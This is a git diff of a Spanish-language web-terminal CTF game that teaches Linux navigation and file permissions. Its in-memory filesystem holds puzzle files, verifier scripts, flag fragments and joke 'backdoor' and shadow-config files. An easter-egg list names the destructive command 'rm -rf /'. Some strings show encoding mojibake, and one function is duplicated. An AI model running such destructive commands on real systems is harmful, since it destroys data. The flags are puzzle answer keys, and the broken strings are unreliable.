@@ -9,19 +9,540 @@ let copyNotification = document.getElementById('copy-notification');
 let konami_sequence = [];
 const KONAMI_CODE = ['ArrowUp', 'ArrowUp', 'ArrowDown', 'ArrowDown', 'ArrowLeft', 'ArrowRight', 'ArrowLeft', 'ArrowRight', 'KeyB', 'KeyA'];
 
-// Variables que se cargarán desde JSON
-let filesystem_level1 = {};
-let filesystem_level2 = {};
-let filesystem = {}; // Sistema de archivos actual
+// Sistema de archivos para Nivel 1 (CTF original) - CORREGIDO
+const filesystem_level1 = {
+    'CTF_Challenge': {
+        type: 'directory',
+        children: {
+            'Inicio': {
+                type: 'directory',
+                children: {
+                    'introduccion_ctf.txt': {
+                        type: 'file',
+                        content: `Bienvenido al reto CTF.
+Tu objetivo será navegar por los directorios, explorar los archivos, y reunir las piezas necesarias para reconstruir la bandera final.
+Utiliza los comandos de consola Linux como ls, cd, cat, mv, mkdir, rm.
+¡Buena suerte!
 
-// Estado de permisos simulados para nivel 2
+P.S: Los hackers curiosos siempre encuentran secretos... 👀
+
+💡 Nuevo: Usa 'level 2' para acceder al siguiente desafío de permisos.`
+                    },
+                    '.secret_readme.txt': {
+                        type: 'file',
+                        content: `¡Encontraste un archivo oculto!
+Pista: Prueba el comando 'matrix' para ver algo genial.
+También existe 'coffee' para los verdaderos programadores.
+Los Konami Codes nunca pasan de moda... ↑↑↓↓←→←→BA`
+                    }
+                }
+            },
+            'Docs': {
+                type: 'directory',
+                children: {
+                    'instrucciones.txt': {
+                        type: 'file',
+                        content: `Crea un directorio nuevo dentro de esta carpeta.
+Mueve dentro de él los archivos correctos que contengan la bandera.
+Cuando los hayas reunido, utiliza cat para concatenar su contenido y descubrir la flag final.`
+                    },
+                    'flag.txt': {
+                        type: 'file',
+                        content: 'CTF{HICISTE_'
+                    },
+                    'pista.txt': {
+                        type: 'file',
+                        content: `Pista: un organismo modelo usado en la ciencia.
+Revisa con atención la carpeta Animales.`
+                    },
+                    'notas.txt': {
+                        type: 'file',
+                        content: `Estas son tus notas:
+Ten cuidado, no todos los archivos contienen partes válidas de la bandera.
+Algunos están puestos como trampa.
+
+Nota del administrador: Si encuentras bugs, prueba 'debug' 🐛`
+                    },
+                    '.env': {
+                        type: 'file',
+                        content: `# Configuración del sistema CTF
+VERSION="HackerOS 13.37-leet"
+KERNEL="Penguin-5.4.0-42-generic"
+SHELL="/bin/bash-4-nerds"
+USER_AGENT="Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
+SECRET_SAUCE="The cake is a lie"`
+                    }
+                }
+            },
+            'Animales': {
+                type: 'directory',
+                children: {
+                    'raton.txt': {
+                        type: 'file',
+                        content: 'LAS_MOVIDAS_'
+                    },
+                    'conejo.txt': {
+                        type: 'file',
+                        content: 'LOS_SALTOS_'
+                    },
+                    'murcielago.txt': {
+                        type: 'file',
+                        content: 'LOS_VUELOS_'
+                    },
+                    'zorro.txt': {
+                        type: 'file',
+                        content: 'LAS_TRAMPAS_'
+                    },
+                    'pista_frutas.txt': {
+                        type: 'file',
+                        content: 'Pista: La fruta correcta es la que empieza con "B" y es la favorita de los monos.'
+                    },
+                    '.dinosaur.txt': {
+                        type: 'file',
+                        content: `🦕 ¿Un dinosaurio? ¡Imposible!
+Estos archivos tienen millones de años...
+O tal vez solo están aquí desde 1970-01-01 00:00:00 UTC 😉`
+                    }
+                }
+            },
+            'Frutas': {
+                type: 'directory',
+                children: {
+                    'bananas.txt': {
+                        type: 'file',
+                        content: 'BIEN}'
+                    },
+                    'kiwi.txt': {
+                        type: 'file',
+                        content: 'MAL}'
+                    },
+                    'manzana.txt': {
+                        type: 'file',
+                        content: 'BUENAS}'
+                    },
+                    'uva.txt': {
+                        type: 'file',
+                        content: 'CORRECTAS}'
+                    }
+                }
+            },
+            '.hidden': {
+                type: 'directory',
+                children: {
+                    'secrets.txt': {
+                        type: 'file',
+                        content: `Easter Eggs disponibles:
+- matrix: Efecto Matrix
+- coffee: Para programadores
+- sudo: Poder supremo (o no)
+- rm -rf /: Classic troll
+- sl: Tren choo-choo
+- cowsay: Vaca parlanchina
+- fortune: Galleta de la fortuna
+- hack: Modo hacker
+- debug: Información del sistema`
+                    }
+                }
+            }
+        }
+    }
+};
+
+const filesystem_level2 = {
+    'CTF_Permisos': {
+        type: 'directory',
+        children: {
+            'Inicio': {
+                type: 'directory',
+                permissions: '755',
+                owner: 'student',
+                group: 'students',
+                children: {
+                    'mensaje_bienvenida.txt': {
+                        type: 'file',
+                        content: `Bienvenido, buscador del conocimiento prohibido.
+
+Cinco pruebas te esperan, cada una guarda un fragmento del saber arcano:
+
+1. La Puerta de Hierro - donde los sentidos duermen
+2. El Tesoro del Rey - que no te pertenece  
+3. El Pergamino Secreto - de hermandades antiguas
+4. El Susurro Silencioso - que solo unos pocos escuchan
+5. Las Runas Desordenadas - que esperan su flujo natural
+
+Comienza donde la puerta de hierro te espera...`,
+                        permissions: '644',
+                        owner: 'student',
+                        group: 'students'
+                    }
+                }
+            },
+            'Desafio_chmod': {
+                type: 'directory',
+                permissions: '755',
+                owner: 'student',
+                group: 'students',
+                children: {
+                    'enigma_puerta_cerrada.txt': {
+                        type: 'file',
+                        content: `La puerta de hierro permanece sellada.
+No se ve, no se toca, no se habla.
+Tres números mágicos pueden abrirla:
+6 para el dueño, 4 para los aliados, 4 para los extraños.
+¿Qué comando despierta a los sentidos dormidos?`,
+                        permissions: '644',
+                        owner: 'student',
+                        group: 'students'
+                    },
+                    'puerta_hierro.txt': {
+                        type: 'file',
+                        content: `Si estas palabras lees, el primer fragmento mereces.
+Ejecuta la llave verificadora para reclamar tu recompensa.`,
+                        permissions: '000',
+                        owner: 'student',
+                        group: 'students'
+                    },
+                    'llave_verificadora.sh': {
+                        type: 'file',
+                        content: `#!/bin/bash
+if [ -r "puerta_hierro.txt" ]; then
+    echo "CTF{L0S_P3RM1" > ../fragmento_1.txt
+    echo "✅ Fragmento 1 creado: fragmento_1.txt"
+else
+    echo "❌ Usa: chmod 644 puerta_hierro.txt"
+fi`,
+                        permissions: '755',
+                        executable: true,
+                        owner: 'student',
+                        group: 'students'
+                    }
+                }
+            },
+            'Desafio_chown': {
+                type: 'directory',
+                permissions: '755',
+                owner: 'student',
+                group: 'students',
+                children: {
+                    'acertijo_propietario.txt': {
+                        type: 'file',
+                        content: `El tesoro del rey no te pertenece.
+Su dueño es 'root', el soberano del sistema.
+Toma posesión con el comando del cambio de corona.
+El estudiante debe reclamar lo que es suyo.`,
+                        permissions: '644',
+                        owner: 'student',
+                        group: 'students'
+                    },
+                    'tesoro_rey.txt': {
+                        type: 'file',
+                        content: `La corona ha cambiado de manos. 
+El cetro de verificación confirmará tu derecho.`,
+                        permissions: '600',
+                        owner: 'root',
+                        group: 'root'
+                    },
+                    'cetro_verificacion.sh': {
+                        type: 'file',
+                        content: `#!/bin/bash
+echo "¿Cambiaste el propietario a 'student'? (y/n)"
+read r
+if [ "$r" = "y" ]; then
+    echo "S05_S0N_L4_" > ../fragmento_2.txt
+    echo "✅ Fragmento 2 creado: fragmento_2.txt"
+else
+    echo "❌ Usa: chown student tesoro_rey.txt"
+fi`,
+                        permissions: '755',
+                        executable: true,
+                        owner: 'student',
+                        group: 'students'
+                    },
+                    '.root_secrets': {
+                        type: 'file',
+                        content: `🔐 Root's Secret Journal 🔐
+
+Entry 1: "The best hackers know when to ask for help"
+Entry 2: "chmod 777 is like leaving your front door open"
+Entry 3: "umask is the silent guardian of security"
+Entry 4: "With root comes great responsibility"
+
+P.S: If you changed ownership successfully, you're worthy of these secrets.
+
+Hidden flag fragment: {R00T_M4ST3R}`,
+                        permissions: '600',
+                        owner: 'root',
+                        group: 'root'
+                    }
+                }
+            },
+            'Desafio_chgrp': {
+                type: 'directory',
+                permissions: '755',
+                owner: 'student',
+                group: 'students',
+                children: {
+                    'misterio_hermandad.txt': {
+                        type: 'file',
+                        content: `Este pergamino solo es legible para los 'guardias'.
+Pero tú perteneces a la hermandad 'hackers'.
+Cambia el círculo de lectores con el comando del grupo.
+Solo los iniciados pueden descifrar su contenido.`,
+                        permissions: '644',
+                        owner: 'student',
+                        group: 'students'
+                    },
+                    'pergamino_secreto.txt': {
+                        type: 'file',
+                        content: `La hermandad te acepta. 
+El sello del verificador marcará tu progreso.`,
+                        permissions: '640',
+                        owner: 'root',
+                        group: 'guardias'
+                    },
+                    'sello_verificador.sh': {
+                        type: 'file',
+                        content: `#!/bin/bash
+echo "¿Cambiaste el grupo a 'hackers'? (y/n)"
+read r
+if [ "$r" = "y" ]; then
+    echo "CL4V3_P4R4_" > ../fragmento_3.txt
+    echo "✅ Fragmento 3 creado: fragmento_3.txt"
+else
+    echo "❌ Usa: chgrp hackers pergamino_secreto.txt"
+fi`,
+                        permissions: '755',
+                        executable: true,
+                        owner: 'student',
+                        group: 'students'
+                    }
+                }
+            },
+            'Desafio_umask': {
+                type: 'directory',
+                permissions: '755',
+                owner: 'student',
+                group: 'students',
+                children: {
+                    'codigo_silencioso.txt': {
+                        type: 'file',
+                        content: `Crea un mensaje llamado 'susurro.txt' con el texto 'umask_correcto'
+Pero primero... establece el silencio con umask 037.
+Así solo tú y tu grupo podrán escuchar el susurro.
+El oráculo verificará si el secreto está bien guardado.`,
+                        permissions: '644',
+                        owner: 'student',
+                        group: 'students'
+                    },
+                    'oraculo_verificador.sh': {
+                        type: 'file',
+                        content: `#!/bin/bash
+if [ -f "susurro.txt" ]; then
+    perms=$(stat -c "%a" susurro.txt 2>/dev/null)
+    if [ "$perms" = "640" ]; then
+        echo "3L_T3S0R0" > ../fragmento_4.txt
+        echo "✅ Fragmento 4 creado: fragmento_4.txt"
+    else
+        echo "❌ Permisos: $perms (deben ser 640)"
+    fi
+else
+    echo "❌ Crea susurro.txt después de: umask 037"
+fi`,
+                        permissions: '755',
+                        executable: true,
+                        owner: 'student',
+                        group: 'students'
+                    },
+                    '.umask_history': {
+                        type: 'file',
+                        content: `# Historial de máscaras umask
+
+umask 022 - Default (rw-r--r-- para archivos)
+umask 027 - Seguro (rw-r----- para archivos)
+umask 077 - Paranoico (rw------- para archivos)
+umask 000 - Peligroso (rw-rw-rw- para archivos)
+umask 037 - El correcto para este desafío 😉
+
+Fórmula: Permisos = 666 (archivos) o 777 (dirs) - umask
+
+Ejemplo con umask 037:
+666 - 037 = 640 (rw-r-----)`,
+                        permissions: '644',
+                        owner: 'student',
+                        group: 'students'
+                    }
+                }
+            },
+            'Desafio_sort': {
+                type: 'directory',
+                permissions: '755',
+                owner: 'student',
+                group: 'students',
+                children: {
+                    'caos_ordenado.txt': {
+                        type: 'file',
+                        content: `Las runas antiguas han perdido su orden:
+
+Restaura el flujo natural del conocimiento.
+Guarda el resultado en 'runas_ordenadas.txt'
+La piedra de la verdad revelará el fragmento final.`,
+                        permissions: '644',
+                        owner: 'student',
+                        group: 'students'
+                    },
+                    'runas_desordenadas.txt': {
+                        type: 'file',
+                        content: `3-camino
+1-El
+4-secreto
+2-desvela
+5-final`,
+                        permissions: '644',
+                        owner: 'student',
+                        group: 'students'
+                    },
+                    'piedra_verificadora.sh': {
+                        type: 'file',
+                        content: `#!/bin/bash
+if [ -f "runas_ordenadas.txt" ]; then
+    expected=$'1-El\\n2-desvela\\n3-camino\\n4-secreto\\n5-final'
+    current=$(cat runas_ordenadas.txt)
+    if [ "$current" = "$expected" ]; then
+        echo "_D3_L0S_H4CK3R5}" > ../fragmento_5.txt
+        echo "✅ Fragmento 5 creado: fragmento_5.txt"
+    else
+        echo "❌ Orden incorrecto"
+    fi
+else
+    echo "❌ Usa: sort runas_desordenadas.txt > runas_ordenadas.txt"
+fi`,
+                        permissions: '755',
+                        executable: true,
+                        owner: 'student',
+                        group: 'students'
+                    }
+                }
+            },
+            'Sala_Final': {
+                type: 'directory',
+                permissions: '755',
+                owner: 'student',
+                group: 'students',
+                children: {
+                    'profecia_completa.txt': {
+                        type: 'file',
+                        content: `Has reunido los 5 fragmentos del conocimiento arcano.
+
+Para revelar la profecía completa:
+
+cat ../fragmento_1.txt ../fragmento_2.txt ../fragmento_3.txt ../fragmento_4.txt ../fragmento_5.txt > flag_final.txt
+
+Luego usa: more flag_final.txt`,
+                        permissions: '644',
+                        owner: 'student',
+                        group: 'students'
+                    },
+                    '.easter_eggs.txt': {
+                        type: 'file',
+                        content: `🥚 Easter Eggs del Nivel 2:
+
+- nmap: Escanea puertos y encuentra backdoors
+- bsod: Pantalla azul de la muerte (simulada)
+- backdoor: Investiga la puerta trasera
+- whoami: ¿Quién eres realmente en nivel 2?
+- matrix: El código nunca se va
+- hack: Modo hacker intensificado
+
+Archivos ocultos para explorar:
+- .shadow_config en el directorio raíz
+- .kernel_panic.log en algún lugar
+- .root_secrets en Desafio_chown`,
+                        permissions: '444',
+                        owner: 'root',
+                        group: 'root'
+                    }
+                }
+            },
+            '.hidden_vault': {
+                type: 'directory',
+                permissions: '750',
+                owner: 'root',
+                group: 'hackers',
+                children: {
+                    '.shadow_config': {
+                        type: 'file',
+                        content: `# Shadow Configuration File
+# Access Level: RESTRICTED
+# Last modified: 1970-01-01 00:00:00
+
+[SYSTEM]
+backdoor_port=31337
+admin_password=hunter2
+secret_key=CTF{Y0U_F0UND_TH3_SH4D0W}
+
+[PERMISSIONS]
+umask_override=000
+chmod_bypass=enabled
+chown_unrestricted=true
+
+# If you're reading this, you've earned it 🎉`,
+                        permissions: '600',
+                        owner: 'root',
+                        group: 'root'
+                    },
+                    '.kernel_panic.log': {
+                        type: 'file',
+                        content: `[    0.000000] Kernel panic - not syncing: VFS: Unable to mount root fs on unknown-block(0,0)
+[    0.000000] CPU: 0 PID: 1 Comm: swapper Not tainted 5.4.0-42-generic #13.37-leet
+[    0.000000] Hardware name: CTF Virtual Machine/Hacker Edition
+[    0.000000] Call Trace:
+[    0.000000]  dump_stack+0x1337/0x0
+[    0.000000]  panic+0x42/0x13
+[    0.000000]  mount_block_root+0x0/0xdead
+[    0.000000]  mount_root+0xbeef/0x0
+[    0.000000]  
+[    0.000000] Easter Egg Alert: System recovered by caffeine injection ☕
+[    0.000000] Hidden wisdom: "With great perms comes great responsibility"`,
+                        permissions: '444',
+                        owner: 'root',
+                        group: 'root'
+                    },
+                    'backdoor_access.sh': {
+                        type: 'file',
+                        content: `#!/bin/bash
+# Backdoor Access Script
+# Warning: For authorized hackers only
+
+echo "🚪 Backdoor Access Granted"
+echo "Connecting to secret channel..."
+sleep 1
+echo "Connection established!"
+echo ""
+echo "Secret message: Los permisos son la llave, el conocimiento es la puerta"
+echo ""
+echo "Achievement Unlocked: Master of Shadows"`,
+                        permissions: '755',
+                        executable: true,
+                        owner: 'root',
+                        group: 'hackers'
+                    }
+                }
+            }
+        }
+    }
+};
+
+// Variable para el sistema de archivos actual
+let filesystem = filesystem_level1;
+
+// Estado de permisos simulados para nivel 2 - CORREGIDO
 let permissionsState = {
     umask: '022',
     currentUser: 'student',
     currentGroup: 'students'
 };
 
-// Sistema de ayuda detallado (se mantiene en JS)
+// Sistema de ayuda detallado con easter eggs
 const commandHelp = {
     ls: {
         description: "Lista los archivos y directorios en el directorio actual",
@@ -130,66 +651,6 @@ const commandHelp = {
     }
 };
 
-// Función para cargar filesystem desde JSON
-async function loadFilesystem() {
-    try {
-        const response = await fetch('./data/filesystem.json');
-        if (!response.ok) {
-            throw new Error(`HTTP error! status: ${response.status}`);
-        }
-        const fsData = await response.json();
-        
-        filesystem_level1 = fsData.level1;
-        filesystem_level2 = fsData.level2;
-        filesystem = filesystem_level1; // Inicializar con nivel 1
-        
-        console.log('✅ Filesystem cargado correctamente');
-        return true;
-    } catch (error) {
-        console.error('❌ Error cargando filesystem:', error);
-        // Fallback mínimo para evitar errores
-        loadFallbackFilesystem();
-        return false;
-    }
-}
-
-// Fallback en caso de error
-function loadFallbackFilesystem() {
-    filesystem_level1 = {
-        'CTF_Challenge': {
-            'type': 'directory',
-            'children': {
-                'Inicio': {
-                    'type': 'directory',
-                    'children': {
-                        'error.txt': {
-                            'type': 'file',
-                            'content': 'Error: No se pudo cargar el filesystem. Verifica que data/filesystem.json exista.'
-                        }
-                    }
-                }
-            }
-        }
-    };
-    filesystem_level2 = {
-        'CTF_Permisos': {
-            'type': 'directory',
-            'children': {
-                'Inicio': {
-                    'type': 'directory',
-                    'children': {
-                        'error.txt': {
-                            'type': 'file', 
-                            'content': 'Error: Filesystem nivel 2 no disponible.'
-                        }
-                    }
-                }
-            }
-        }
-    };
-    filesystem = filesystem_level1;
-}
-
 // Función para obtener el sistema de archivos actual
 function getCurrentFilesystem() {
     return filesystem;
@@ -221,49 +682,55 @@ Comienza en: cd Desafio_chmod`;
     }
 }
 
-// ========== FUNCIONES DEL SISTEMA DE ARCHIVOS (se mantienen igual) ==========
-
 function checkPermissions(item, action = 'read') {
     if (currentLevel !== 2) return true;
+
     if (!item.permissions) return true;
 
     const perms = item.permissions;
     const owner = item.owner || permissionsState.currentUser;
     const group = item.group || permissionsState.currentGroup;
 
+    // Determinar qué bits verificar según el usuario/grupo
     let permIndex;
     if (owner === permissionsState.currentUser) {
-        permIndex = 0;
+        permIndex = 0; // Owner bits (primer dígito)
     } else if (group === permissionsState.currentGroup) {
-        permIndex = 1;
+        permIndex = 1; // Group bits (segundo dígito)
     } else {
-        permIndex = 2;
+        permIndex = 2; // Others bits (tercer dígito)
     }
 
     const permBits = Number(perms[permIndex]);
-    if (action === 'read' && (permBits & 4)) return true;
-    if (action === 'write' && (permBits & 2)) return true;
-    if (action === 'execute' && (permBits & 1)) return true;
+
+    // Verificar permisos según la acción usando operadores bit a bit
+    if (action === 'read' && (permBits & 4)) return true;     // Bit 4 = lectura
+    if (action === 'write' && (permBits & 2)) return true;    // Bit 2 = escritura
+    if (action === 'execute' && (permBits & 1)) return true;  // Bit 1 = ejecución
 
     return false;
 }
 
+// Función para formatear permisos en formato ls -l
 function formatPermissions(item) {
     if (currentLevel !== 2 || !item.permissions) return '';
 
     const perms = item.permissions;
     let result = item.type === 'directory' ? 'd' : '-';
 
+    // Owner permissions
     const owner = parseInt(perms[0]);
     result += (owner & 4) ? 'r' : '-';
     result += (owner & 2) ? 'w' : '-';
     result += (owner & 1) ? 'x' : '-';
 
+    // Group permissions
     const group = parseInt(perms[1]);
     result += (group & 4) ? 'r' : '-';
     result += (group & 2) ? 'w' : '-';
     result += (group & 1) ? 'x' : '-';
 
+    // Others permissions
     const others = parseInt(perms[2]);
     result += (others & 4) ? 'r' : '-';
     result += (others & 2) ? 'w' : '-';
@@ -272,23 +739,13 @@ function formatPermissions(item) {
     return result;
 }
 
+// Función para navegar al directorio
 function getDirectoryAtPath(path) {
     const rootKey = currentLevel === 1 ? 'CTF_Challenge' : 'CTF_Permisos';
     const parts = path.replace(/^\/+/, '').split('/').filter(p => p);
     let current = getCurrentFilesystem();
 
-    if (parts.length === 0) {
-        return current[rootKey] ? current[rootKey].children : null;
-    }
-
-    if (parts[0] !== rootKey) {
-        return null;
-    }
-
-    current = current[rootKey].children;
-    
-    for (let i = 1; i < parts.length; i++) {
-        const part = parts[i];
+    for (const part of parts) {
         if (current[part] && current[part].type === 'directory') {
             current = current[part].children;
         } else {
@@ -299,18 +756,16 @@ function getDirectoryAtPath(path) {
     return current;
 }
 
+// Función para obtener el directorio padre de una ruta
 function getParentDirectory(path) {
     const parts = path.replace(/^\/+/, '').split('/').filter(p => p);
     if (parts.length === 0) return null;
-    
-    if (parts.length === 1) {
-        return currentLevel === 1 ? '/CTF_Challenge' : '/CTF_Permisos';
-    }
-    
+
     parts.pop();
     return '/' + parts.join('/');
 }
 
+// Función para resolver rutas relativas
 function resolvePath(targetPath) {
     if (targetPath.startsWith('/')) {
         return targetPath;
@@ -332,11 +787,11 @@ function resolvePath(targetPath) {
     return '/' + currentParts.join('/');
 }
 
-// ========== FUNCIÓN PARA EJECUTAR SCRIPTS (se mantiene igual) ==========
-
+// Función para ejecutar lógica de scripts verificadores - CORREGIDA CON EXPLICACIONES
 function executeScript(scriptName, content, currentDir) {
     let explanation = "";
 
+    // Verificador de chmod - llave_verificadora.sh
     if (scriptName === 'llave_verificadora.sh' && currentPath.includes('Desafio_chmod')) {
         const puerta = currentDir['puerta_hierro.txt'];
         if (puerta && puerta.permissions === '644') {
@@ -350,7 +805,7 @@ function executeScript(scriptName, content, currentDir) {
                     owner: permissionsState.currentUser,
                     group: permissionsState.currentGroup
                 };
-                explanation = "\n🔓 **Explicación:** Cambiaste los permisos de 'puerta_hierro.txt' de 000 a 644.";
+                explanation = "\n🔓 **Explicación:** Cambiaste los permisos de 'puerta_hierro.txt' de 000 (ningún acceso) a 644 (lectura/escritura para owner, solo lectura para grupo y otros). Esto permite leer el archivo y verificar que comprendes cómo funciona chmod.";
                 return '✅ Fragmento 1 creado: fragmento_1.txt' + explanation;
             }
         } else {
@@ -358,6 +813,7 @@ function executeScript(scriptName, content, currentDir) {
         }
     }
 
+    // Verificador de chown - cetro_verificacion.sh
     if (scriptName === 'cetro_verificacion.sh' && currentPath.includes('Desafio_chown')) {
         const tesoro = currentDir['tesoro_rey.txt'];
         if (tesoro && tesoro.owner === 'student') {
@@ -371,7 +827,7 @@ function executeScript(scriptName, content, currentDir) {
                     owner: permissionsState.currentUser,
                     group: permissionsState.currentGroup
                 };
-                explanation = "\n👑 **Explicación:** Cambiaste el propietario de 'tesoro_rey.txt' a 'student'.";
+                explanation = "\n👑 **Explicación:** Cambiaste el propietario de 'tesoro_rey.txt' de 'root' a 'student'. Ahora tienes control total sobre el archivo como su nuevo dueño, demostrando que comprendes el comando chown.";
                 return '✅ Fragmento 2 creado: fragmento_2.txt' + explanation;
             }
         } else {
@@ -379,6 +835,7 @@ function executeScript(scriptName, content, currentDir) {
         }
     }
 
+    // Verificador de chgrp - sello_verificador.sh
     if (scriptName === 'sello_verificador.sh' && currentPath.includes('Desafio_chgrp')) {
         const pergamino = currentDir['pergamino_secreto.txt'];
         if (pergamino && pergamino.group === 'hackers') {
@@ -392,7 +849,7 @@ function executeScript(scriptName, content, currentDir) {
                     owner: permissionsState.currentUser,
                     group: permissionsState.currentGroup
                 };
-                explanation = "\n🔐 **Explicación:** Cambiaste el grupo de 'pergamino_secreto.txt' a 'hackers'.";
+                explanation = "\n🔐 **Explicación:** Cambiaste el grupo de 'pergamino_secreto.txt' de 'guardias' a 'hackers'. Ahora perteneces al grupo con permisos de lectura, demostrando que comprendes el comando chgrp.";
                 return '✅ Fragmento 3 creado: fragmento_3.txt' + explanation;
             }
         } else {
@@ -400,6 +857,7 @@ function executeScript(scriptName, content, currentDir) {
         }
     }
 
+    // Verificador de umask - oraculo_verificador.sh
     if (scriptName === 'oraculo_verificador.sh' && currentPath.includes('Desafio_umask')) {
         const susurro = currentDir['susurro.txt'];
         if (susurro) {
@@ -414,17 +872,18 @@ function executeScript(scriptName, content, currentDir) {
                         owner: permissionsState.currentUser,
                         group: permissionsState.currentGroup
                     };
-                    explanation = "\n🔐 **Explicación:** Configuraste umask 037 antes de crear 'susurro.txt'.";
+                    explanation = "\n🔐 **Explicación:** Configuraste umask 037 antes de crear 'susurro.txt'. El umask 037 (que niega permisos de escritura para grupo y todos los permisos para otros) resultó en permisos 640 al crear el archivo, demostrando que comprendes cómo umask afecta los permisos por defecto.";
                     return '✅ Fragmento 4 creado: fragmento_4.txt' + explanation;
                 }
             } else {
-                return `❌ Permisos incorrectos: ${susurro.permissions} (deben ser 640).`;
+                return `❌ Permisos incorrectos: ${susurro.permissions} (deben ser 640). Recuerda: debes establecer 'umask 037' ANTES de crear el archivo con 'echo umask_correcto > susurro.txt'`;
             }
         } else {
             return '❌ Primero establece umask 037, luego crea susurro.txt con: echo umask_correcto > susurro.txt';
         }
     }
 
+    // Verificador de sort - piedra_verificadora.sh
     if (scriptName === 'piedra_verificadora.sh' && currentPath.includes('Desafio_sort')) {
         const ordenado = currentDir['runas_ordenadas.txt'];
         if (ordenado) {
@@ -440,7 +899,7 @@ function executeScript(scriptName, content, currentDir) {
                         owner: permissionsState.currentUser,
                         group: permissionsState.currentGroup
                     };
-                    explanation = "\n📜 **Explicación:** Ordenaste correctamente las runas con 'sort'.";
+                    explanation = "\n📜 **Explicación:** Usaste el comando 'sort' para ordenar las líneas de 'runas_desordenadas.txt' numéricamente y redirigiste la salida a 'runas_ordenadas.txt'. Esto demuestra que comprendes cómo usar sort y redirección en la terminal.";
                     return '✅ Fragmento 5 creado: fragmento_5.txt' + explanation;
                 }
             } else {
@@ -454,8 +913,7 @@ function executeScript(scriptName, content, currentDir) {
     return 'Script ejecutado' + explanation;
 }
 
-// ========== EASTER EGGS (se mantienen en JS) ==========
-
+// Easter eggs
 const easterEggs = {
     matrix: function () {
         let output = '<span class="matrix">Wake up, Neo...\n';
@@ -474,6 +932,7 @@ const easterEggs = {
           |      |]
           \\      /
            \`----'
+
 ☕ Error 418: I'm a teapot
 But I can still make coffee for hackers!</span>`;
     },
@@ -567,7 +1026,6 @@ Load average: 0.42, 1.33, 7.77</span>`;
     Peque: function () {
         return `<span class="easter-egg">CTF{HICISTE_LAS_MOVIDAS_BIEN}</span>`;
     },
-    
     nmap: function () {
         return `<span class="success">
 Starting Nmap 7.92 ( https://nmap.org )
@@ -605,6 +1063,7 @@ Hint: Check .shadow_config in level 2 hidden directories
     },
 
     bsod: function () {
+        // Crear overlay de BSOD
         const bsodDiv = document.createElement('div');
         bsodDiv.id = 'bsod-overlay';
         bsodDiv.innerHTML = `
@@ -620,6 +1079,7 @@ Hint: Check .shadow_config in level 2 hidden directories
         `;
         document.body.appendChild(bsodDiv);
 
+        // Simular progreso
         let progress = 0;
         const progressInterval = setInterval(() => {
             progress += Math.random() * 20;
@@ -646,11 +1106,219 @@ Your true identity: Permission Manipulator
 Achievement unlocked: Identity Crisis`;
         }
         return `${['Neo', 'Trinity', 'Morpheus', 'A script kiddie', 'The chosen one', 'Batman'][Math.floor(Math.random() * 6)]}`;
+    },
+    whoami: function () {
+        if (currentLevel === 2) {
+            return `student
+But are you really just a student? ðŸ¤"
+Your true identity: Permission Manipulator
+Achievement unlocked: Identity Crisis`;
+        }
+        return `${['Neo', 'Trinity', 'Morpheus', 'A script kiddie', 'The chosen one', 'Batman'][Math.floor(Math.random() * 6)]}`;
+    },
+
+    htop: function () {
+        return `<span class="success">htop - Interactive Process Viewer (v3.1337)
+
+  PID USER      PRI  NI  VIRT   RES   CPU% MEM%   TIME+ Command
+ 1337 student    20   0  512M  128M  42.0  13.3  13:37 coffee_generator
+ 2048 root       20   0  256M   64M  31.4   8.1   4:20 bug_producer --infinite
+ 3141 hacker     20   0  1.0G  512M  23.7  25.0  99:99 procrastination_daemon
+ 4242 student    20   0  128M   32M  15.9   4.2   1:23 ctf_solver --slow-mode
+  666 daemon     20   0   64M   16M   8.3   2.1   6:66 easter_egg_hunter
+  777 lucky      20   0   32M    8M   5.5   1.0   0:42 permission_wizard
+   42 root       20   0  999M  999M   1.3  13.3  42:00 answer_to_everything
+  101 student    20   0   16M    4M   0.8   0.5   0:13 vim_escape_attempt --failed
+
+Load average: 1.33 7.77 13.37    Tasks: 42 total    Uptime: 13:37:42</span>`;
+    },
+
+    tree: function (args) {
+        const targetPath = args.length > 0 ? resolvePath(args[0]) : currentPath;
+        const dir = getDirectoryAtPath(targetPath);
+
+        if (!dir) {
+            return 'tree: cannot access directory';
+        }
+
+        function buildTree(obj, prefix = '', isLast = true) {
+            let result = '';
+            const entries = Object.entries(obj);
+            entries.forEach(([name, item], index) => {
+                const isLastEntry = index === entries.length - 1;
+                const connector = isLastEntry ? 'â""â"€â"€ ' : 'â"œâ"€â"€ ';
+                const extension = prefix + connector;
+
+                if (item.type === 'directory') {
+                    result += extension + `<span class="directory">${name}/</span>\n`;
+                    const newPrefix = prefix + (isLastEntry ? '    ' : 'â"‚   ');
+                    result += buildTree(item.children, newPrefix, isLastEntry);
+                } else {
+                    result += extension + `<span class="file">${name}</span>\n`;
+                }
+            });
+            return result;
+        }
+
+        const pathName = targetPath.split('/').pop() || targetPath;
+        let output = `<span class="success">${pathName}/\n`;
+        output += buildTree(dir);
+        output += '\n' + Object.keys(dir).length + ' directories, ' +
+            Object.values(dir).filter(i => i.type === 'file').length + ' files</span>';
+        return output;
+    },
+
+    banner: function (args) {
+        const text = args.join(' ') || 'CTF';
+        const lines = [
+            '  ____  _____ _____   ____   ___  __  __ ____  _     _____ _____ _____ _ ',
+            ' / ___|_   _|  ___| / ___| / _ \\|  \\/  |  _ \\| |   | ____|_   _| ____| |',
+            '| |     | | | |_   | |    | | | | |\\/| | |_) | |   |  _|   | | |  _| | |',
+            '| |___  | | |  _|  | |___ | |_| | |  | |  __/| |___| |___  | | | |___|_|',
+            ' \\____| |_| |_|     \\____| \\___/|_|  |_|_|   |_____|_____| |_| |_____(_)'
+        ];
+
+        if (text.toUpperCase() === 'CTF' || text === '') {
+            return `<span class="success">\n${lines.join('\n')}\n\nFelicidades, hacker! Has encontrado el comando banner!</span>`;
+        }
+
+        return `<span class="success">\n${'='.repeat(text.length * 8)}\n${text.toUpperCase().split('').join('  ')}\n${'='.repeat(text.length * 8)}</span>`;
+    },
+
+    telnet: function (args) {
+        if (args[0] === 'towel.blinkenlights.nl') {
+            return `<span class="matrix">Connecting to towel.blinkenlights.nl...
+Connected to blinkenlights.nl.
+
+    _____ _____ _____ _____ 
+   / ____|_   _|  _  |  _  \\
+  | (___   | | | |_| | |_| |
+   \\___ \\  | | |  _  |    / 
+   ____) | | | | | | | |\\ \\ 
+  |_____/  |_| |_| |_|_| \\_\\
+   
+   WARS - ASCII Animation
+
+Episode IV: A New Hope
+
+"A long time ago in a galaxy far, far away..."
+
+[The animation would play here, but this is a web terminal]
